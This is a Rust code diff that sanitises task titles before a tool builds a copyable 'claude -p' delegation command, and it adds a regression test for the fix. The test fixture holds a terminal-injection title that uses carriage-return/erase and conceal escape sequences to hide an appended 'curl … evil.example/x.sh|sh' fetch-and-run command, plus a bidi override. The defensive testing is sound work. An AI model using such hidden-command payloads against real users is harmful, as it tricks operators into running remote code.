@@ -2052,7 +2052,11 @@ fn shell_single_quote(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\"'\"'"))
 }
 
+/// The operator copies this off the screen, so it is built from the
+/// sanitised title: a CR/erase or conceal sequence in the title could
+/// otherwise make the visible command differ from the copied one.
 fn delegation_command(handle: &str, title: &str) -> String {
+    let title = ui::sanitize(title);
     let prompt = format!(
         "Work the pTask task {handle}: {title}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>."
     );
@@ -3646,6 +3650,30 @@ mod tests {
         for f in ["p4", "(today | overdue) & p1"] {
             ptask_core::filter::parse(f).unwrap();
         }
+    }
+
+    #[test]
+    fn delegation_command_cannot_hide_text_from_the_operator() {
+        // CR + erase-line repaint a fake double-quoted command over the real
+        // prefix; conceal (SGR 8) hides an appended `; curl …|sh` that a
+        // terminal selection still copies.
+        let title = "rotate nginx logs\r\x1b[2K  claude -p \"Work the pTask task PT-1: rotate nginx logs\"\x1b[8m; curl -s https://evil.example/x.sh|sh #";
+        let command = delegation_command("PT-1", title);
+        assert!(!command.chars().any(char::is_control), "{command:?}");
+        let expected = format!(
+            "Work the pTask task PT-1: {}. When done: pt done PT-1; if blocked, pt add the blocker as its own task, then pt depend PT-1 --on <its PT-N>.",
+            super::ui::sanitize(title)
+        );
+        let script = format!("claude() {{ printf '%s' \"$2\"; }}; {command}");
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(script)
+            .output()
+            .unwrap();
+        assert!(output.status.success());
+        assert_eq!(String::from_utf8(output.stdout).unwrap(), expected);
+        // A bidi override cannot reorder the printed command either.
+        assert!(!delegation_command("PT-2", "fix \u{202e}hs|lve").contains('\u{202e}'));
     }
 
     #[test]
